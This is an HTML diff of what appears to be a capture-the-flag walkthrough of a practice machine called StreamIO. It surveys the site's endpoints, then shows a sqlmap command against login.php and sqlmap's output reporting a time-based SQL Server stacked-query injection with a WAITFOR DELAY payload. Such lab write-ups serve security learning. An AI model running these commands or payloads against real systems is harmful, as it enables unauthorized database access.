@@ -291,9 +291,31 @@ nuclei now returns some info for <code>watch.streamio.htb</code>, but nothing in
 
 <p>Soooo let's look on all those endpoints...
 Starting with the register.php endpoint. We can type in a username and a password. The site will always respond with "Account created" nevertheless, we registered the username before.</p>
-<p>[picture here]
-But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.
-[picture here]</p>
+<p>[picture here]</p>
+<p>But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.</p>
+<p>[picture here]</p>
+<p><code>contact.php</code> had a form available but did't lead to anything.
+<code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
+<code>admin/master.php</code> showed this</p>
+<p>[picture here]</p>
+<p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
+<p>[picture here]</p>
+<p>Let's see what <img alt="sqlmap" src="https://github.com/sqlmapproject/sqlmap"> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
+<div class="highlight"><pre><span></span><code>sqlmap.py -u https://streamIO.htb/login.php --method POST --data <span class="nv">username</span><span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>FUZZ --batch --time-sec <span class="m">1</span>
+</code></pre></div>
+
+<p>sqlmap was lucky, sort of lucky because the injection is time based... ZZZZZzzzzzZZZZZzzzzz</p>
+<div class="highlight"><pre><span></span><code>sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: username=FUZZ&#39;;WAITFOR DELAY &#39;0:0:1&#39;--&amp;password=FUZZ
+---
+web server operating system: Windows 10 or 2016 or 2019
+web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
+back-end DBMS: Microsoft SQL Server 2019
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
